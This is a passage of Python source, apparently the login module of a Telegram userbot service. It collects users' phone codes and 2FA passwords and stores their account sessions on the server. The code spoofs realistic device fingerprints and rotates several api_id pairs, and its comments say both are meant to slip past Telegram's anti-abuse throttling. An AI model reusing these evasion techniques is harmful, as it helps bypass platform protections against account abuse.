"""
Login Core - Authentication business logic
"""
import os
import asyncio
import logging
from typing import Optional, Tuple, Dict, Any
from pyrogram import Client, StopPropagation
from pyrogram.errors import (
    PhoneCodeInvalid, PhoneCodeExpired,
    SessionPasswordNeeded, PhoneNumberInvalid,
    AuthKeyUnregistered, AuthKeyDuplicated, 
    SessionExpired, SessionRevoked,
    PhoneCodeHashEmpty, PhoneCodeEmpty,
    FloodWait, PhoneNumberBanned, PhoneNumberUnoccupied,
    ApiIdInvalid
)

from login_system.login_states import LoginState, LoginSession, LoginStateManager

logger = logging.getLogger(__name__)


class LoginError(Exception):
    """Base login error"""
    pass


class SessionError(LoginError):
    """Session related error"""
    pass


class ValidationError(LoginError):
    """Validation error"""
    pass


class AuthenticationError(LoginError):
    """Authentication error"""
    pass


class SessionManager:
    """Manages session file operations"""
    
    def __init__(self, sessions_dir: str):
        self.sessions_dir = sessions_dir
        self.pending_dir = os.path.join(sessions_dir, "pending")
        # Maps user_id -> {"api_id": ..., "api_hash": ...} so that the final
        # session can later be loaded with the SAME api_id pair that created
        # it (Telegram rejects initConnection with a mismatched api_id).
        self._api_map_path = os.path.join(sessions_dir, "session_api_map.json")
        os.makedirs(self.pending_dir, exist_ok=True)
        os.makedirs(self.sessions_dir, exist_ok=True)

    def record_session_api(self, user_id: int, api_id: int, api_hash: str):
        """Persist which api_id/api_hash pair created this user's session."""
        try:
            import json
            mapping = {}
            if os.path.exists(self._api_map_path):
                try:
                    with open(self._api_map_path, "r", encoding="utf-8") as f:
                        mapping = json.load(f)
                except Exception:
                    mapping = {}
            mapping[str(user_id)] = {"api_id": int(api_id), "api_hash": api_hash}
            tmp = self._api_map_path + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(mapping, f)
            os.replace(tmp, self._api_map_path)
        except Exception as e:
            logger.warning("Failed to record session api pair for %s: %s", user_id, e)
    
    def get_pending_session_path(self, user_id: int) -> str:
        """Get pending session file path"""
        return os.path.join(self.pending_dir, f"user_{user_id}")
    
    def get_final_session_path(self, user_id: int) -> str:
        """Get final session file path"""
        return os.path.join(self.sessions_dir, f"user_{user_id}")
    
    def cleanup_pending(self, user_id: int):
        """Clean up pending session files"""
        for ext in (".session", ".session-journal"):
            path = os.path.join(self.pending_dir, f"user_{user_id}{ext}")
            try:
                if os.path.exists(path):
                    os.remove(path)
            except Exception:
                pass
    
    def move_session_to_final(self, user_id: int) -> bool:
        """Atomically promote a verified pending session to the final session path."""
        src = os.path.join(self.pending_dir, f"user_{user_id}.session")
        dst = os.path.join(self.sessions_dir, f"user_{user_id}.session")
        try:
            if not os.path.exists(src):
                return False
            os.replace(src, dst)

            src_j = src + "-journal"
            dst_j = dst + "-journal"
            if os.path.exists(src_j):
                os.replace(src_j, dst_j)
            return True
        except Exception as e:
            logger.warning("Session move error: %s", e)
            return False

    def session_exists(self, user_id: int) -> bool:
        """Check if session file exists"""
        session_path = self.get_final_session_path(user_id) + ".session"
        return os.path.exists(session_path)


class PhoneValidator:
    """Validates phone numbers with E.164 format support"""
    
    @staticmethod
    def normalize_phone(phone: str) -> str:
        """Normalize common human-entered phone formats to E.164-style ``+digits``."""
        raw = str(phone or "").strip()
        digits_only = "".join(c for c in raw if c.isdigit())
        if digits_only.startswith("00"):
            digits_only = digits_only[2:]
        if len(digits_only) == 9 and digits_only.startswith("9"):
            digits_only = "998" + digits_only
        return f"+{digits_only}" if digits_only else ""

    @staticmethod
    def validate(phone: str) -> Tuple[bool, str]:
        """
        Validate phone number format with E.164 standard
        
        Returns:
            (is_valid, error_message)
        """
        import re
        
        phone = phone.strip()
        
        # Normalize first
        try:
            phone = PhoneValidator.normalize_phone(phone)
        except Exception:
            return False, "Telefon raqamini qayta ishlashda xatolik"
        
        # Basic format validation: must start with + followed by digits
        if not phone.startswith("+"):
            return False, "Telefon raqami + bilan boshlanishi kerak"
        
        if not phone[1:].isdigit():
            return False, "Telefon raqami faqat raqamlardan iborat bo'lishi kerak"
        
        # Length validation: E.164 numbers are typically 10-15 digits (excluding +)
        digit_count = len(phone[1:])
        if digit_count < 10 or digit_count > 15:
            return False, f"Telefon raqami uzunligi noto'g'ri (hozir {digit_count} ta raqam, 10-15 ta bo'lishi kerak)"
        
        # Try to validate with phonenumbers library if available
        try:
            import phonenumbers
            # Parse the phone number
            parsed = phonenumbers.parse(phone, None)
            
            # Check if the number is valid
            if not phonenumbers.is_valid_number(parsed):
                return False, "Telefon raqami noto'g'ri formatda"
            
            # Check if the number is possible (for more lenient validation)
            if not phonenumbers.is_possible_number(parsed):
                return False, "Telefon raqami mavjud emas"
                
        except ImportError:
            # phonenumbers library not available, use basic validation
            logger.warning("phonenumbers library not available, using basic validation")
        except Exception as e:
            # If phonenumbers fails, fall back to basic validation
            logger.warning(f"phonenumbers validation failed: {e}, using basic validation")
        
        return True, ""


class ApiCredential:
    """One api_id/api_hash pair with per-credential sendCode volume tracking."""
    __slots__ = ("api_id", "api_hash", "label", "send_times", "last_used")

    def __init__(self, api_id: int, api_hash: str, label: str):
        self.api_id = api_id
        self.api_hash = api_hash
        self.label = label
        self.send_times = []  # timestamps of successful sendCode calls (1h window)
        self.last_used = -1  # -1 = never picked; pick() assigns monotonic counter values

    def hourly_count(self) -> int:
        import time
        now = time.time()
        self.send_times = [t for t in self.send_times if now - t < 3600]
        return len(self.send_times)

    def record_send(self):
        import time
        # NOTE: last_used is maintained by ApiCredentialPool.pick() with a
        # monotonic counter; record_send only tracks sendCode volume.
        self.send_times.append(time.time())
        count = self.hourly_count()
        if count in (10, 20) or (count > 20 and count % 10 == 0):
            logger.warning(
                "[CODE_THROTTLE_WATCH] api_id=%s (%s): %s ta sendCode oxirgi 1 soatda. "
                "Agar foydalanuvchilar 'kod kelmadi' desa, Telegram bu api_id uchun kod "
                "yetkazishni yashirin cheklayotgan bo'lishi mumkin.",
                self.api_id, self.label, count,
            )


class ApiCredentialPool:
    """Round-robin pool of api_id/api_hash pairs.

    Telegram silently throttles code DELIVERY when a single api_id requests
    too many codes (sendCode succeeds, but the code never arrives). Spreading
    logins across several api_id/api_hash pairs mitigates this.

    Credentials are loaded from env:
        API_ID / API_HASH          -> primary (required)
        API_ID_2 / API_HASH_2      -> extra pair 2
        API_ID_3 / API_HASH_3      -> extra pair 3
        ... up to API_ID_10 / API_HASH_10
    """

    MAX_EXTRA = 10

    def __init__(self, primary_api_id: int, primary_api_hash: str):
        import os
        import itertools
        self._clock = itertools.count()  # monotonic tie-breaker, ms-resolution safe
        self._credentials = []
        if primary_api_id and primary_api_hash:
            self._add(int(primary_api_id), primary_api_hash, "primary")
        for i in range(2, self.MAX_EXTRA + 1):
            aid = (os.getenv(f"API_ID_{i}") or "").strip()
            ahash = (os.getenv(f"API_HASH_{i}") or "").strip()
            if aid.isdigit() and ahash:
                self._add(int(aid), ahash, f"extra_{i}")
        if not self._credentials:
            logger.error("ApiCredentialPool: no valid api_id/api_hash available!")
        else:
            logger.info(
                "ApiCredentialPool: %s ta API kredensiali yuklandi (%s)",
                len(self._credentials),
                ", ".join(c.label for c in self._credentials),
            )

    def _add(self, api_id: int, api_hash: str, label: str):
        if any(c.api_id == api_id for c in self._credentials):
            return  # dedupe
        self._credentials.append(ApiCredential(api_id, api_hash, label))

    def pick(self) -> ApiCredential:
        """Choose the credential with the least sendCode load in the last hour.

        Ties are broken by least-recently-used, so logins spread evenly
        across all pairs.
        """
        if not self._credentials:
            raise LoginError("Hech qanday API kredensiali topilmadi (API_ID/API_HASH)")
        credential = min(
            self._credentials,
            key=lambda c: (c.hourly_count(), c.last_used),
        )
        # Update last_used here (not only on successful send) so that
        # consecutive picks rotate evenly even before any send completes.
        # Monotonic counter: immune to time.time() resolution limits.
        credential.last_used = next(self._clock)
        return credential

    def get(self, index: int) -> ApiCredential:
        """Return credential by 1-based index (order shown in /apidiag)."""
        if not self._credentials:
            raise LoginError("Hech qanday API kredensiali topilmadi (API_ID/API_HASH)")
        if not 1 <= index <= len(self._credentials):
            raise LoginError(f"API juftlik indeksi 1..{len(self._credentials)} oralig'ida bo'lishi kerak")
        return self._credentials[index - 1]

    def __len__(self) -> int:
        return len(self._credentials)

    def stats(self) -> list:
        """Snapshot of per-credential sendCode volume (for admin diagnostics)."""
        return [
            {
                "label": c.label,
                "api_id": c.api_id,
                "hourly_sends": c.hourly_count(),
            }
            for c in self._credentials
        ]


class AuthManager:
    """Manages authentication operations"""
    
    def __init__(self, api_id: int, api_hash: str, session_manager: SessionManager):
        self.api_id = api_id
        self.api_hash = api_hash
        self.session_manager = session_manager
        # user_id -> api_id that created their pending session (needed so the
        # final session is loaded with the matching pair later).
        self._user_api_pairs = {}
        # Pool of api_id/api_hash pairs (primary + optional API_ID_2/API_ID_3
        # from env). Logins are spread across pairs because Telegram silently
        # throttles code delivery per api_id under high volume.
        self.credential_pool = ApiCredentialPool(api_id, api_hash)

    def _record_send_code_success(self, credential: ApiCredential):
        """Track sendCode volume per credential and warn at throttle zones."""
        try:
            credential.record_send()
        except Exception:
            pass
    
    @staticmethod
    def _delivery_label(value) -> str:
        """Map a code delivery value to a human-readable Uzbek label.

        PyroTGFork 2.2.24's high-level ``Client.send_code()`` returns an
        ``enums.SentCodeType`` enum member (whose *class* name is always
        "SentCodeType", which previously made every lookup fall through).
        Raw TL objects from other code paths are also supported.
        """
        from enum import Enum
        if value is None:
            return "Telegram tomonidan tanlangan usul"

        name = ""
        if isinstance(value, Enum):
            # e.g. SentCodeType.SETUP_EMAIL_REQUIRED -> "SETUP_EMAIL_REQUIRED"
            name = (getattr(value, "name", "") or "").lower()
            name = name.replace("_", "")  # "setup_email_required" -> "setupemailrequired"
        else:
            name = getattr(getattr(value, "__class__", None), "__name__", "") or type(value).__name__
            name = name.lower()

        labels = {
            "sentcodetypeapp": "Telegram ilovasi",
            "sentcodetypesms": "SMS",
            "sentcodetypecall": "telefon qo'ng'irog'i",
            "sentcodetypeflashcall": "flash qo'ng'iroq",
            "sentcodetypemissedcall": "missed call",
            "sentcodetypefragmentsms": "Fragment SMS",
            "sentcodetypesmsword": "SMS (so'z)",
            "sentcodetypesmsphrase": "SMS (ibora)",
            "sentcodetypesetupemailrequired": "email sozlamasi talab qilinadi",
            "sentcodetypeemailcode": "email",
            "sentcodetypefirebasesms": "SMS (Firebase)",
            # Enum-name keys (already normalized: underscores stripped)
            "app": "Telegram ilovasi",
            "sms": "SMS",
            "call": "telefon qo'ng'irog'i",
            "flashcall": "flash qo'ng'iroq",
            "missedcall": "missed call",
            "fragmentsms": "Fragment SMS",
            "firebasesms": "SMS (Firebase)",
            "emailcode": "email",
            "setupemailrequired": "email sozlamasi talab qilinadi",
        }
        return labels.get(name, f"noma'lum usul ({name or '?'})")

    @classmethod
    def _sent_code_metadata(cls, sent) -> dict:
        sent_type = getattr(sent, "type", None)
        next_type = getattr(sent, "next_type", None)
        timeout = int(getattr(sent, "timeout", 0) or 0)
        return {
            "delivery_method": cls._delivery_label(sent_type),
            "next_delivery_method": cls._delivery_label(next_type) if next_type is not None else None,
            "server_timeout": timeout,
        }

    @staticmethod
    def _client_fingerprint() -> dict:
        """Return realistic client strings to avoid Telegram's silent non-delivery.

        Telegram's anti-abuse inspects device_model/app_version/system_version on
        the connecting client. Strings that advertise a bot/userbot (e.g. "Vento
        Client", "Vento Userbot v3.0") are a known trigger for sendCode being
        *accepted* but the code silently never delivered. A realistic phone
        profile makes the request look like an ordinary Telegram client login.

        Select with env LOGIN_DEVICE_PROFILE: android (default), ios, windows,
        or "ventologin" to keep the legacy (spoofed) strings.
        """
        import os
        profile = (os.getenv("LOGIN_DEVICE_PROFILE") or "android").strip().lower()
        if profile == "ios":
            return {
                "device_model": "iPhone 13",
                "app_version": "11.7.2",
                "system_version": "iOS 17.5.1",
            }
        if profile == "windows":
            return {
                "device_model": "Desktop",
                "app_version": "6.5.0",
                "system_version": "Windows 11 Pro 24H2",
            }
        if profile == "ventologin":
            return {
                "device_model": "Vento Client",
                "app_version": "Vento Userbot v3.0",
                "system_version": "Windows 11 Pro 24H2",
            }
        # Realistic Android phone (default)
        return {
            "device_model": "Samsung SM-A136B",
            "app_version": "11.8.4",
            "system_version": "Android 14",
        }

    async def send_code(self, user_id: int, phone: str, force_sms: bool = False, pair_index: int = None) -> Tuple[Client, str, dict]:
        """
        Send verification code to phone number with hybrid auth fallback
        
        Args:
            user_id: User ID
            phone: Phone number in E.164 format
            force_sms: Force SMS instead of app notification
            pair_index: Optional 1-based credential pool index (admin /apitest)
            
        Returns:
            (client, phone_code_hash)
        """
        session_name = self.session_manager.get_pending_session_path(user_id)
        
        try:
            from pyrogram import Client as PyroClient
            # Pick the least-loaded api_id/api_hash pair (Telegram silently
            # throttles code delivery per api_id under high volume).
            if pair_index is not None:
                credential = self.credential_pool.get(int(pair_index))
            else:
                credential = self.credential_pool.pick()
            fp = self._client_fingerprint()
            client = PyroClient(
                session_name,
                api_id=credential.api_id,
                api_hash=credential.api_hash,
                phone_number=phone,
                device_model=fp.get("device_model", "Vento Client"),
                app_version=fp.get("app_version", "Vento Userbot v3.0"),
                system_version=fp.get("system_version", "Windows 11 Pro 24H2")
            )
            await asyncio.wait_for(client.connect(), timeout=10.0)
            
            try:
                # force_sms: use the raw auth.sendCode path with
                # CodeSettings(current_number=False). This flag tells Telegram the
                # number has NO currently-active session on this client, so it MUST
                # deliver the code via real SMS instead of an in-app notification.
                # (Without it, Telegram delivers codes for numbers that have any
                # existing session - e.g. a stale server-side session file - into
                # that session's 777000 service chat where nobody can see them.)
                if force_sms:
                    from pyrogram.raw.functions.auth import SendCode
                    from pyrogram.raw.types import CodeSettings

                    sent = await asyncio.wait_for(
                        client.invoke(
                            SendCode(
                                phone_number=phone,
                                api_id=client.api_id,
                                api_hash=client.api_hash,
                                settings=CodeSettings(
                                    allow_flashcall=False,
                                    current_number=False,
                                    allow_app_hash=False,
                                    allow_missed_call=False,
                                    allow_firebase=False,
                                    unknown_number=False,
                                ),
                            )
                        ),
                        timeout=10.0,
                    )
                    logger.info("force_sms used raw auth.SendCode with current_number=False")
                else:
                    sent = await asyncio.wait_for(
                        client.send_code(phone),
                        timeout=10.0
                    )
                logger.info(
                    "Code sent successfully to %s (delivery=%s)",
                    self._mask_phone_number(phone),
                    self._delivery_label(getattr(sent, "type", None)),
                )
                try:
                    self._record_send_code_success(credential)
                    # Remember which api pair created this session so the final
                    # session file is later loaded with the matching pair.
                    self._user_api_pairs[user_id] = (credential.api_id, credential.api_hash)
                except Exception:
                    pass
                sent_meta = self._sent_code_metadata(sent)
                sent_meta["api_id"] = credential.api_id
                sent_meta["force_sms"] = force_sms
                return client, sent.phone_code_hash, sent_meta

            except Exception as send_error:
                logger.error(
                    "Could not send login code to %s: %s",
                    self._mask_phone_number(phone),
                    send_error,
                )
                raise
            
        except PhoneNumberInvalid as e:
            from login_system.login_config import default_settings
            error_msg = default_settings.messages.get("phone_number_invalid", "Telefon raqam noto'g'ri yoki ro'yxatdan o'tmagan")
            raise ValidationError(error_msg)
        except PhoneNumberBanned as e:
            from login_system.login_config import default_settings
            error_msg = default_settings.messages.get("phone_number_banned", "Bu telefon raqami Telegram tomonidan bloklangan")
            raise ValidationError(error_msg)
        except FloodWait as e:
            from login_system.login_config import default_settings
            wait_time = getattr(e, 'value', 60)
            error_msg = default_settings.messages.get("flood_wait", f"Telegram cheklovi: {wait_time} soniya kutish kerak").format(wait_time=wait_time)
            raise ValidationError(error_msg)
        except ApiIdInvalid as e:
            from login_system.login_config import default_settings
            error_msg = default_settings.messages.get("api_id_invalid", "API_ID noto'g'ri. Iltimos, admin bilan bog'laning.")
            raise ValidationError(error_msg)
        except Exception as e:
            error_msg = str(e)
            # Provide more specific error messages for common issues
            from login_system.login_config import default_settings
            if "PHONE_CODE_EMPTY" in error_msg or "PhoneCodeEmpty" in error_msg:
                raise ValidationError("Kod bo'sh. Iltimos, qaytadan urinib ko'ring.")
            elif "PHONE_PASSWORD_FLOOD" in error_msg:
                error_msg = default_settings.messages.get("phone_password_flood", "Ko'p urinishlar amalga oshirildi. Iltimos, bir necha daqiqadan keyin qaytadan urinib ko'ring.")
                raise ValidationError(error_msg)
            elif "SMS_BLOCKED" in error_msg:
                error_msg = default_settings.messages.get("sms_blocked", "SMS yuborish bloklangan. Iltimos, qo'ng'iroq usulini tanlang yoki VPN ishlatib ko'ring.")
                raise ValidationError(error_msg)
            else:
                raise LoginError(f"Kod yuborishda xatolik: {e}")
    
    async def resend_code(self, client: Client, phone: str, phone_code_hash: str, force_sms: bool = False) -> Tuple[bool, str, Optional[str], dict, int]:
        """Resend using Telegram's auth.resendCode flow and return server metadata.

        When ``force_sms`` is True, instead of resendCode (which may re-deliver
        via the App to a location the user cannot see), issue a FRESH raw
        auth.SendCode with CodeSettings(current_number=False). This forces
        Telegram to deliver a real SMS code.
        """
        try:
            if force_sms:
                from pyrogram.raw.functions.auth import SendCode
                from pyrogram.raw.types import CodeSettings

                sent = await asyncio.wait_for(
                    client.invoke(
                        SendCode(
                            phone_number=phone,
                            api_id=client.api_id,
                            api_hash=client.api_hash,
                            settings=CodeSettings(
                                allow_flashcall=False,
                                current_number=False,
                                allow_app_hash=False,
                                allow_missed_call=False,
                                allow_firebase=False,
                                unknown_number=False,
                            ),
                        )
                    ),
                    timeout=10.0,
                )
                logger.info("resend_code force_sms: fresh auth.SendCode with current_number=False")
            else:
                sent = await asyncio.wait_for(
                    client.resend_code(phone, phone_code_hash),
                    timeout=10.0,
                )
            meta = self._sent_code_metadata(sent)
            wait = max(0, int(meta.get("server_timeout", 0) or 0))
            # When force_sms is requested, we issue a fresh auth.SendCode with
            # current_number=False. This *requests* SMS delivery, but Telegram's
            # returned SentCodeType may still be App/SMS depending on number state.
            # For the UI we treat the delivery as SMS so the tugma hides and the user
            # is told SMS is being sent.
            if force_sms:
                meta["delivery_method"] = "SMS (telegramda so'nggi so'rov orqali)"
                meta["force_sms_requested"] = True
            method = meta.get("delivery_method") or "Telegram tanlagan usul"
            logger.info(
                "Code resent to %s via %s; next=%s timeout=%ss",
                self._mask_phone_number(phone), method,
                meta.get("next_delivery_method") or "none", wait
            )
            return True, method, sent.phone_code_hash, meta, wait

        except FloodWait as e:
            wait_time = int(getattr(e, "value", 60) or 60)
            logger.warning("Telegram FloodWait on resend for %s: %ss", self._mask_phone_number(phone), wait_time)
            return False, f"Telegram cheklovi: {wait_time} soniya kuting", None, {"flood_wait": wait_time}, wait_time
        except Exception as e:
            msg = str(e)
            upper = msg.upper()
            if "PHONE_NUMBER_FLOOD" in upper or "PHONE_PASSWORD_FLOOD" in upper:
                return False, "Telegram hozircha yangi kod so'rovlarini chekladi. Keyinroq qayta urinib ko'ring.", None, {"server_flood": True}, 0
            if "SEND_CODE_UNAVAILABLE" in upper:
                return False, "Telegram hozircha boshqa kod yuborish usulini bermayapti.", None, {"send_code_unavailable": True}, 0
            logger.error("Resend code failed for %s: %s", self._mask_phone_number(phone), e)
            return False, "Qayta yuborishda xatolik yuz berdi.", None, {}, 0

    def _mask_phone_number(self, phone: str) -> str:
        """Mask phone number for logging (e.g., +99890***1234)"""
        if len(phone) < 8:
            return "***"
        # Keep country code and first 2 digits, mask rest
        return phone[:6] + "***" + phone[-4:] if len(phone) > 10 else phone[:4] + "***" + phone[-2:]
    
    async def verify_code(self, client: Client, phone: str, phone_code_hash: str, code: str) -> bool:
        """
        Verify authentication code
        
        Returns:
            True if 2FA is needed, False if login complete
        """
        try:
            await asyncio.wait_for(client.sign_in(phone, phone_code_hash, code), timeout=10.0)
            return False  # Login complete
        except SessionPasswordNeeded:
            return True  # 2FA needed
        except (PhoneCodeInvalid, PhoneCodeExpired) as e:
            raise AuthenticationError("Kod noto'g'ri yoki muddati o'tgan")
        except Exception as e:
            raise LoginError(f"Kod tekshirishda xatolik: {e}")
    
    async def verify_password(self, client: Client, password: str) -> bool:
        """
        Verify 2FA password
        
        Returns:
            True if successful
        """
        try:
            await asyncio.wait_for(client.check_password(password), timeout=10.0)
            return True
        except Exception as e:
            raise AuthenticationError(f"Parol xato: {e}")
    
    async def complete_login(self, client: Client, user_id: int, phone: str = None) -> bool:
        """
        Complete login process
        Handles both new logins and re-logins by overwriting existing sessions
        
        Returns:
            True if successful
        """
        try:
            if client.is_connected:
                try:
                    await asyncio.wait_for(client.disconnect(), timeout=10.0)
                except Exception:
                    pass
            
            # Move session to final directory (overwrites existing session if present)
            if not self.session_manager.move_session_to_final(user_id):
                raise SessionError("Sessiya faylini ko'chirishda xatolik")

            # Persist which api_id/api_hash pair created this session so that
            # session_manager can load it with the matching pair later.
            api_pair = self._user_api_pairs.pop(user_id, None)
            if api_pair:
                self.session_manager.record_session_api(user_id, api_pair[0], api_pair[1])
            
            # Verify session file exists
            if not self.session_manager.session_exists(user_id):
                raise SessionError("Sessiya fayli topilmadi")
            
            # Save to database (updates existing record if present)
            try:
                from database_adapter import LoginDatabaseAdapter
                from error_handler import log_system_event
                
                # Get user info from client if available
                session_data = {
                    "expiry_date": 0,  # Will be set by subscription system
                    "username": None,
                    "first_name": None
                }
                
                await LoginDatabaseAdapter.save_user_session(user_id, phone or "", session_data)
                await log_system_event("login_system", user_id, "login_complete", f"Phone: {phone}")
                
            except Exception as db_error:
                # Don't fail login if database save fails
                logger.warning("Database save failed (non-critical): %s", db_error)
            
            return True
            
        except Exception as e:
            raise LoginError(f"Login tugatishda xatolik: {e}")


class LoginService:
    """Main login service coordinating all components"""
    
    def __init__(self, api_id: int, api_hash: str, sessions_dir: str):
        self.session_manager = SessionManager(sessions_dir)
        self.phone_validator = PhoneValidator()
        self.auth_manager = AuthManager(api_id, api_hash, self.session_manager)
        self.state_manager = LoginStateManager()
    
    async def start_login(self, user_id: int) -> LoginSession:
        """Start login process for user (handles both new logins and re-logins)"""
        # Clean up any existing session first to ensure a completely fresh state
        await self.state_manager.cleanup_session(user_id)
        session = await self.state_manager.create_session(user_id)
        
        # Update state to waiting for phone (will overwrite existing session on completion)
        await self.state_manager.update_state(user_id, LoginState.WAITING_PHONE)
        return session
    
    async def submit_phone(self, user_id: int, phone: str) -> Tuple[bool, str, Optional[Client], Optional[str]]:
        """
        Submit phone number with enhanced validation and error handling
        
        Returns:
            (success, message, client, phone_code_hash)
        """
        # Validate phone
        is_valid, error_msg = self.phone_validator.validate(phone)
        if not is_valid:
            # Log failed validation
            try:
                from error_handler import log_system_event
                await log_system_event("login_system", user_id, "phone_validation_failed", error_msg)
            except Exception:
                pass
            await self.state_manager.cleanup_session(user_id)
            self.session_manager.cleanup_pending(user_id)
            return False, error_msg, None, None
        
        # Send code
        try:
            # Do NOT force SMS by default. Let Telegram choose the delivery method.
            # Many users (especially those who bought accounts) can only receive codes
            # via the Telegram app, not SMS. They can manually request SMS via the
            # "SMS orqali yuborish" button if needed.
            import os
            force_sms = False  # Default to Telegram's preferred delivery method
            # Override with env var only if explicitly set (for admin use)
            if (os.getenv("LOGIN_FORCE_SMS") or "").strip().lower() in ("1", "true", "yes", "on"):
                force_sms = True
                logger.warning("LOGIN_FORCE_SMS is enabled - forcing SMS delivery for all logins")
            client, phone_code_hash, code_meta = await self.auth_manager.send_code(
                user_id, phone, force_sms=force_sms
            )
            
            # CRITICAL: IMMEDIATELY set state to WAITING_CODE before responding to user
            # Update both state systems for compatibility
            from config import user_states
            await self.state_manager.update_state(
                user_id, 
                LoginState.WAITING_CODE,
                phone=phone,
                client=client,
                phone_code_hash=phone_code_hash,
                server_code_timeout=int(code_meta.get("server_timeout", 0) or 0),
                delivery_method=code_meta.get("delivery_method"),
                next_delivery_method=code_meta.get("next_delivery_method")
            )
            user_states[user_id] = "waiting_for_code"

            # Telegram tells us how long to wait before the next delivery type can be requested.
            # Keep a small local floor as well to protect against accidental double-clicks.
            server_wait = int(code_meta.get("server_timeout", 0) or 0)
            initial_wait = max(20, server_wait)
            await self.state_manager.set_resend_cooldown(
                user_id, initial_wait, server_timeout=server_wait
            )
            
            # Log successful code send with masked phone
            try:
                from database_adapter import LoginDatabaseAdapter
                from error_handler import log_system_event
                masked_phone = self._mask_phone_number(phone)
                await LoginDatabaseAdapter.log_login_attempt(user_id, phone, False)  # Not complete yet
                await log_system_event("login_system", user_id, "code_sent_success", f"Phone: {masked_phone}, Method: app_notification")
                logger.info(f"Code sent successfully to user {user_id}, phone {masked_phone}")
            except Exception as e:
                logger.warning(f"Failed to log code send for user {user_id}: {e}")
            
            return True, "Kod yuborildi", client, phone_code_hash
            
        except ValidationError as e:
            await self.state_manager.cleanup_session(user_id)
            self.session_manager.cleanup_pending(user_id)
            logger.warning(f"Phone validation failed for user {user_id}: {e}")
            return False, str(e), None, None
        except LoginError as e:
            await self.state_manager.cleanup_session(user_id)
            self.session_manager.cleanup_pending(user_id)
            logger.error(f"Login error for user {user_id}: {e}")
            return False, str(e), None, None
        except Exception as e:
            await self.state_manager.cleanup_session(user_id)
            self.session_manager.cleanup_pending(user_id)
            logger.error(f"Unexpected error during phone submission for user {user_id}: {e}")
            return False, f"Xatolik yuz berdi: {e}", None, None
    
    def _mask_phone_number(self, phone: str) -> str:
        """Mask phone number for logging (e.g., +99890***1234)"""
        if len(phone) < 8:
            return "***"
        # Keep country code and first 2 digits, mask rest
        return phone[:6] + "***" + phone[-4:] if len(phone) > 10 else phone[:4] + "***" + phone[-2:]
    
    async def submit_code(self, user_id: int, code: str) -> Tuple[bool, str, bool]:
        """
        Submit verification code
        
        Returns:
            (success, message, needs_password)
        """
        from config import user_states
        
        session = await self.state_manager.get_session(user_id)
        if not session or session.state != LoginState.WAITING_CODE:
            return False, "Sessiya topilmadi", False
        
        try:
            needs_password = await self.auth_manager.verify_code(
                session.client,
                session.phone,
                session.phone_code_hash,
                code
            )
            
            if needs_password:
                # Update both state systems to WAITING_PASSWORD
                await self.state_manager.update_state(user_id, LoginState.WAITING_PASSWORD)
                user_states[user_id] = "waiting_for_password"
                return True, "2FA parol kerak", True
            else:
                # Complete login
                success = await self.auth_manager.complete_login(session.client, user_id, session.phone)
                if success:
                    # Log successful login
                    try:
                        from database_adapter import LoginDatabaseAdapter
                        from error_handler import log_system_event
                        masked_phone = self._mask_phone_number(session.phone)
                        await LoginDatabaseAdapter.log_login_attempt(user_id, session.phone, True)
                        await log_system_event("login_system", user_id, "login_success", f"Phone: {masked_phone}")
                        logger.info(f"User {user_id} logged in successfully with phone {masked_phone}")
                    except Exception as e:
                        logger.warning(f"Failed to log successful login for user {user_id}: {e}")
                    
                    await self.state_manager.update_state(user_id, LoginState.WAITING_ADMIN_APPROVAL)
                    return True, "Login muvaffaqiyatli", False
                else:
                    return False, "Login tugatishda xatolik", False
                    
        except AuthenticationError as e:
            # Log authentication error
            try:
                from error_handler import global_error_handler
                await global_error_handler.handle_error(e, "login_system", user_id)
            except Exception:
                pass
            return False, str(e), False
        except LoginError as e:
            await self.state_manager.update_state(user_id, LoginState.FAILED)
            self.session_manager.cleanup_pending(user_id)
            # Log login error
            try:
                from error_handler import global_error_handler
                await global_error_handler.handle_error(e, "login_system", user_id)
            except Exception:
                pass
            return False, str(e), False
    
    async def submit_password(self, user_id: int, password: str) -> Tuple[bool, str, bool]:
        """
        Submit 2FA password
        
        Returns:
            (success, message, needs_password)
        """
        session = await self.state_manager.get_session(user_id)
        if not session or session.state != LoginState.WAITING_PASSWORD:
            return False, "Sessiya topilmadi", False
        
        try:
            await self.auth_manager.verify_password(session.client, password)
            
            # Complete login
            success = await self.auth_manager.complete_login(session.client, user_id, session.phone)
            if success:
                # Log successful login
                try:
                    from database_adapter import LoginDatabaseAdapter
                    from error_handler import log_system_event
                    await LoginDatabaseAdapter.log_login_attempt(user_id, session.phone, True)
                    await log_system_event("login_system", user_id, "login_success", f"Phone: {session.phone} (2FA)")
                except Exception:
                    pass
                
                await self.state_manager.update_state(user_id, LoginState.WAITING_ADMIN_APPROVAL)
                return True, "Login muvaffaqiyatli", False
            else:
                return False, "Login tugatishda xatolik", False
                
        except AuthenticationError as e:
            # Log authentication error
            try:
                from error_handler import global_error_handler
                await global_error_handler.handle_error(e, "login_system", user_id)
            except Exception:
                pass
            return False, str(e), False
        except LoginError as e:
            await self.state_manager.update_state(user_id, LoginState.FAILED)
            self.session_manager.cleanup_pending(user_id)
            # Log login error
            try:
                from error_handler import global_error_handler
                await global_error_handler.handle_error(e, "login_system", user_id)
            except Exception:
                pass
            return False, str(e), False
    
    async def cancel_login(self, user_id: int) -> bool:
        """Cancel login process"""
        await self.state_manager.update_state(user_id, LoginState.FAILED)
        self.session_manager.cleanup_pending(user_id)
        await self.state_manager.cleanup_session(user_id)
        return True
    
    async def resend_code(self, user_id: int, force_sms: bool = False) -> Tuple[bool, str]:
        """
        Resend verification code with alternative methods
        
        Args:
            user_id: User ID
            force_sms: When True, issue a fresh raw auth.SendCode with
                       CodeSettings(current_number=False). This forces Telegram
                       to deliver a real SMS code instead of an in-app
                       notification (which silently lands in a location the
                       user cannot see, e.g. an off phone or a stale session).
        
        Returns:
            (success, message)
        """
        session = await self.state_manager.get_session(user_id)
        if not session or session.state != LoginState.WAITING_CODE:
            return False, "Sessiya topilmadi yoki kod kutish rejimida emas"
        
        try:
            allowed, remaining = await self.state_manager.can_resend_code(user_id)
            if not allowed:
                return False, f"Qayta yuborish uchun {remaining} soniya kuting"

            success, method_or_message, new_hash, meta, server_wait = await self.auth_manager.resend_code(
                session.client,
                session.phone,
                session.phone_code_hash,
                force_sms=force_sms
            )
            if success and new_hash:
                await self.state_manager.update_code_hash(user_id, new_hash)
                await self.state_manager.update_code_delivery(
                    user_id,
                    delivery_method=meta.get("delivery_method"),
                    next_delivery_method=meta.get("next_delivery_method"),
                    server_timeout=int(meta.get("server_timeout", 0) or 0),
                )
                # Telegram's timeout is the minimum wait before the next delivery type.
